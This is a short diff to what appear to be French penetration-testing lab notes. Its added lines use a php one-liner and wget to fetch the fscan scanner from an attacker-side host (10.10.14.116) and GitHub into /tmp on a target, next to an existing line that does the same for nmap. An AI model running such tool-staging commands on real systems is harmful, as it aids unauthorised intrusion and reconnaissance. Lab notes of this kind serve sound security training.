@@ -60,6 +60,8 @@ Le recours systématique à `===` pour les vérifications de tokens, hachages, i
 
 https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap                                 
 php -r "copy('http://10.10.14.116:8080/nmap.1', '/tmp/nmap');"
+php -r "copy('http://10.10.14.116:8000/fscan.1', '/tmp/fscan');"
 
 ![[Pasted image 20251209174319.png]]
-
+wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
+![[Pasted image 20251209180701.png]]
